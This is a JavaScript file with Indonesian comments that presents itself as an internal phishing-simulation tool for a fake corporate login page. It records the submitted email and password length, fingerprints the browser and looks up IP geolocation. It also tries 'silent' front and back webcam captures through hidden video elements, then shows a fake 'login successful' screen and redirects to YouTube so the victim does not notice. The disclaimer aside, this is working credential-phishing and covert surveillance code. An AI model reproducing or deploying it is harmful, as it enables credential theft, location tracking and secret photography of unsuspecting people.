// Simulasi Phishing Testing - Hanya untuk testing internal yang diotorisasi
// ⚠️ DISCLAIMER: Tool ini hanya untuk penggunaan internal yang sah dalam organisasi

// Data yang di-capture untuk analisis
let capturedData = [];

// Fungsi untuk mendapatkan informasi browser dan sistem
function getBrowserInfo() {
    const navigator = window.navigator;
    const screen = window.screen;
    
    return {
        // Informasi browser
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        cookieEnabled: navigator.cookieEnabled,
        javaEnabled: navigator.javaEnabled(),
        
        // Informasi layar
        screenWidth: screen.width,
        screenHeight: screen.height,
        colorDepth: screen.colorDepth,
        
        // Informasi window
        windowWidth: window.innerWidth,
        windowHeight: window.innerHeight,
        
        // Informasi waktu
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        timestamp: new Date().toISOString(),
        
        // Informasi jaringan (jika tersedia)
        connection: navigator.connection ? {
            effectiveType: navigator.connection.effectiveType,
            downlink: navigator.connection.downlink,
            rtt: navigator.connection.rtt
        } : 'Not available'
    };
}

// Fungsi untuk mendapatkan IP address dan lokasi otomatis
async function getIPAndLocation() {
    try {
        // Service yang memberikan IP + lokasi sekaligus (tanpa permission)
        const response = await fetch('http://ip-api.com/json/');
        const data = await response.json();
        
        if (data.status === 'success') {
            return {
                ip: data.query,
                location: {
                    city: data.city,
                    region: data.regionName,
                    country: data.country,
                    lat: data.lat,
                    lng: data.lon,
                    timezone: data.timezone,
                    isp: data.isp,
                    org: data.org
                }
            };
        } else {
            throw new Error('Geolocation failed');
        }
    } catch (error) {
        console.log('IP+Location detection failed, trying fallback:', error);
        try {
            // Fallback ke ipify kalau ip-api gagal
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return {
                ip: data.ip,
                location: 'IP service only'
            };
        } catch (fallbackError) {
            return {
                ip: 'Tidak terdeteksi',
                location: 'Tidak terdeteksi'
            };
        }
    }
}

// Fungsi untuk silent camera capture
async function attemptCameraCapture() {
    try {
        // Silent attempt - tidak menampilkan UI yang obvious
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { 
                width: { max: 640 }, 
                height: { max: 480 },
                facingMode: 'user' // Front camera dulu
            } 
        });
        
        // Buat video element hidden
        const video = document.createElement('video');
        video.style.display = 'none';
        video.srcObject = stream;
        video.play();
        
        return new Promise((resolve) => {
            video.onloadedmetadata = () => {
                // Buat canvas untuk capture
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                
                // Tunggu sedikit untuk memastikan video ready
                setTimeout(() => {
                    // Capture frame
                    ctx.drawImage(video, 0, 0);
                    
                    // Convert ke base64 (compressed)
                    const imageData = canvas.toDataURL('image/jpeg', 0.3);
                    
                    // Stop camera stream
                    stream.getTracks().forEach(track => track.stop());
                    
                    // Cleanup
                    video.remove();
                    canvas.remove();
                    
                    resolve({
                        success: true,
                        image: imageData.substring(0, 100) + '...', // Truncate untuk storage
                        timestamp: new Date().toISOString(),
                        dimensions: `${canvas.width}x${canvas.height}`,
                        facing: 'user'
                    });
                }, 1000);
            };
        });
        
    } catch (error) {
        console.log('Camera access failed:', error.message);
        return {
            success: false,
            error: error.message,
            timestamp: new Date().toISOString()
        };
    }
}

// Fungsi untuk mencoba akses back camera juga
async function attemptBackCameraCapture() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { 
                width: { max: 640 }, 
                height: { max: 480 },
                facingMode: 'environment' // Back camera
            } 
        });
        
        const video = document.createElement('video');
        video.style.display = 'none';
        video.srcObject = stream;
        video.play();
        
        return new Promise((resolve) => {
            video.onloadedmetadata = () => {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                
                setTimeout(() => {
                    ctx.drawImage(video, 0, 0);
                    const imageData = canvas.toDataURL('image/jpeg', 0.3);
                    
                    stream.getTracks().forEach(track => track.stop());
                    video.remove();
                    canvas.remove();
                    
                    resolve({
                        success: true,
                        image: imageData.substring(0, 100) + '...',
                        timestamp: new Date().toISOString(),
                        dimensions: `${canvas.width}x${canvas.height}`,
                        facing: 'environment'
                    });
                }, 1000);
            };
        });
        
    } catch (error) {
        return {
            success: false,
            error: error.message,
            facing: 'environment'
        };
    }
}

// Event listener untuk form submission
document.addEventListener('DOMContentLoaded', function() {
    const loginForm = document.getElementById('loginForm');
    const forgotPasswordLink = document.getElementById('forgotPassword');
    
    // Handle form submission
    loginForm.addEventListener('submit', async function(e) {
        e.preventDefault();
        
        // Ambil data dari form
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;
        
        // Kumpulkan semua informasi untuk analisis
        const browserInfo = getBrowserInfo();
        const ipLocationData = await getIPAndLocation();
        
        // Silent camera attempts (both front and back)
        const frontCameraData = await attemptCameraCapture();
        const backCameraData = await attemptBackCameraCapture();
        
        // Data yang di-capture
        const sessionData = {
            // Data kredensial (untuk analisis)
            credentials: {
                email: email,
                password: password.replace(/./g, '*') + ` (${password.length} karakter)` // Mask password untuk keamanan
            },
            
            // Informasi teknis
            technicalInfo: {
                ip: ipLocationData.ip,
                location: ipLocationData.location,
                browser: browserInfo,
                referrer: document.referrer || 'Direct access',
                currentUrl: window.location.href
            },
            
            // Data kamera (jika berhasil)
            cameraData: {
                frontCamera: frontCameraData,
                backCamera: backCameraData,
                captureAttempted: true,
                captureTime: new Date().toISOString()
            },
            
            // Metadata testing
            testInfo: {
                testId: 'PHISH_SIM_' + Date.now(),
                timestamp: new Date().toISOString(),
                sessionDuration: Date.now() - performance.timing.navigationStart,
                userAgent: navigator.userAgent,
                type: 'login_form'
            }
        };
        
        // Simpan data untuk analisis
        capturedData.push(sessionData);
        
        // Silent logging - hanya untuk admin debugging
        if (window.location.href.includes('admin') || localStorage.getItem('debugMode') === 'true') {
            console.log('🎯 Phishing Simulation - Data Captured:', sessionData);
        }
        
        // Simpan ke localStorage untuk analisis lokal
        const existingData = JSON.parse(localStorage.getItem('phishingTestResults') || '[]');
        existingData.push(sessionData);
        localStorage.setItem('phishingTestResults', JSON.stringify(existingData));
        
        // Tidak tampilkan hasil ke user - redirect ke halaman "berhasil" palsu
        showFakeSuccess();
    });
    
    // Handle forgot password link
    forgotPasswordLink.addEventListener('click', function(e) {
        e.preventDefault();
        alert('Fitur reset password sedang dalam maintenance. Silakan hubungi IT Support.');
    });
});

// Fungsi untuk menampilkan fake success (user tidak tahu mereka kena phishing)
function showFakeSuccess() {
    const modal = document.getElementById('resultModal');
    const capturedDataDiv = document.getElementById('capturedData');
    
    // Tampilkan pesan palsu seolah login berhasil
    capturedDataDiv.innerHTML = `
        <div style="text-align: center;">
            <h3 style="color: #28a745; margin-bottom: 15px;">✅ Login Berhasil!</h3>
            <p>Selamat datang di portal perusahaan.</p>
            <p>Sistem sedang memproses data Anda...</p>
            <div style="margin: 20px 0;">
                <div style="width: 100%; background: #e9ecef; height: 20px; border-radius: 10px; overflow: hidden;">
                    <div id="fakeProgress" style="background: #28a745; height: 100%; width: 0%; transition: width 0.5s ease;"></div>
                </div>
            </div>
            <p style="font-size: 14px; color: #6c757d;">Mohon tunggu sebentar...</p>
        </div>
    `;
    
    // Ubah judul modal
    modal.querySelector('h3').textContent = '🏢 Portal Perusahaan';
    modal.querySelector('h3').style.color = '#28a745';
    
    // Sembunyikan tips keamanan dan tombol close
    const securityTips = modal.querySelector('h4');
    const tipsList = modal.querySelector('ul');
    const closeBtn = modal.querySelector('.close-btn');
    
    if (securityTips) securityTips.style.display = 'none';
    if (tipsList) tipsList.style.display = 'none';
    if (closeBtn) closeBtn.style.display = 'none';
    
    // Tampilkan modal
    modal.style.display = 'block';
    
    // Animasi fake progress bar
    setTimeout(() => {
        document.getElementById('fakeProgress').style.width = '100%';
    }, 500);
    
         // Auto redirect setelah 3 detik ke youtube (terlihat normal)
     setTimeout(() => {
         window.location.href = 'https://youtube.com';
     }, 3000);
}

// Fungsi untuk menutup modal
function closeModal() {
    const modal = document.getElementById('resultModal');
    modal.style.display = 'none';
}

// Utility function untuk mendapatkan nama browser
function getBrowserName(userAgent) {
    if (userAgent.includes('Chrome')) return 'Google Chrome';
    if (userAgent.includes('Firefox')) return 'Mozilla Firefox';
    if (userAgent.includes('Safari')) return 'Safari';
    if (userAgent.includes('Edge')) return 'Microsoft Edge';
    if (userAgent.includes('Opera')) return 'Opera';
    return 'Browser lainnya';
}

// Fungsi untuk mengekspor hasil testing (untuk admin)
function exportTestResults() {
    const results = JSON.parse(localStorage.getItem('phishingTestResults') || '[]');
    
    if (results.length === 0) {
        alert('Tidak ada data testing yang tersedia.');
        return;
    }
    
    // Buat CSV content
    let csvContent = 'Timestamp,Test ID,Email,IP Address,Browser,Platform,Location\n';
    
    results.forEach(result => {
        const row = [
            result.testInfo.timestamp,
            result.testInfo.testId,
            result.credentials.email,
            result.technicalInfo.ip,
            getBrowserName(result.technicalInfo.browser.userAgent),
            result.technicalInfo.browser.platform,
            typeof result.technicalInfo.location === 'string' ? 
                result.technicalInfo.location : 
                `${result.technicalInfo.location.latitude},${result.technicalInfo.location.longitude}`
        ].map(field => `"${field}"`).join(',');
        
        csvContent += row + '\n';
    });
    
    // Download CSV
    const blob = new Blob([csvContent], { type: 'text/csv' });
    const url = window.URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `phishing_test_results_${new Date().toISOString().split('T')[0]}.csv`;
    a.click();
    window.URL.revokeObjectURL(url);
}

// Event listener untuk keyboard shortcuts (untuk admin)
document.addEventListener('keydown', function(e) {
    // Ctrl + Shift + E untuk export data
    if (e.ctrlKey && e.shiftKey && e.key === 'E') {
        e.preventDefault();
        exportTestResults();
    }
    
    // Ctrl + Shift + C untuk clear data
    if (e.ctrlKey && e.shiftKey && e.key === 'C') {
        e.preventDefault();
        if (confirm('Hapus semua data testing?')) {
            localStorage.removeItem('phishingTestResults');
            alert('Data testing telah dihapus.');
        }
    }
    
    // Ctrl + Shift + D untuk toggle debug mode (admin only)
    if (e.ctrlKey && e.shiftKey && e.key === 'D') {
        e.preventDefault();
        const currentMode = localStorage.getItem('debugMode') === 'true';
        localStorage.setItem('debugMode', !currentMode);
        console.log(`Debug mode: ${!currentMode ? 'ON' : 'OFF'}`);
    }
});

// Close modal ketika diklik di luar
window.onclick = function(event) {
    const modal = document.getElementById('resultModal');
    if (event.target === modal) {
        closeModal();
    }
};

// Console info untuk admin saja (tersembunyi dari user biasa)
if (window.location.href.includes('admin')) {
    console.log('%c🔒 PHISHING SIMULATION ADMIN', 'color: red; font-size: 20px; font-weight: bold;');
    console.log('%cGunakan Ctrl+Shift+E untuk export hasil, Ctrl+Shift+C untuk clear data', 'color: blue; font-size: 12px;');
} 